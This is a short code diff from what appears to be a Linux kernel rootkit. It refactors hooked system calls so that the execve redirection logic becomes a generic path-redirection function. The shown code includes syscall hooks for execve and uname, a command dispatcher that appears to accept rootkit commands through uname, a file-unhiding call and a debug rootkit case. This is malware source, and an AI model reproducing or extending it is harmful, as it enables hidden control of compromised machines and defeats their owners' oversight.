@@ -234,7 +234,7 @@ new_sys_execve(const char *__filename, const char **argv, const char **envp)
 
 	old_path[MAX_PATH_LEN-1] = 0;
 
-	new_path = redirect_execve((char *)old_path);
+	new_path = get_redirect_path((char *)old_path, REDIRECT_PATH_EXECVE);
 	if (new_path) {
 		unsigned int new_path_len = anima_strlen(new_path);
 		int path_len_delta = (int)new_path_len - (int)anima_strlen(old_path);
@@ -573,11 +573,11 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 		vfs_unhide_filename(args.p_param1, args.param2);
 		break;
 	case REDIRECT_EXECVE:
-		redirect_execve_path(args.p_param1, args.param2,
-				     args.p_param3, args.param4);
+		redirect_path(args.p_param1, args.param2,
+				args.p_param3, args.param4, REDIRECT_PATH_EXECVE);
 		break;
 	case UNREDIRECT_EXECVE:
-		unredirect_execve_path(args.p_param1, args.param2);
+		unredirect_path(args.p_param1, args.param2, REDIRECT_PATH_EXECVE);
 		break;
 #ifdef DEBUG
 	case DEBUG_RK:
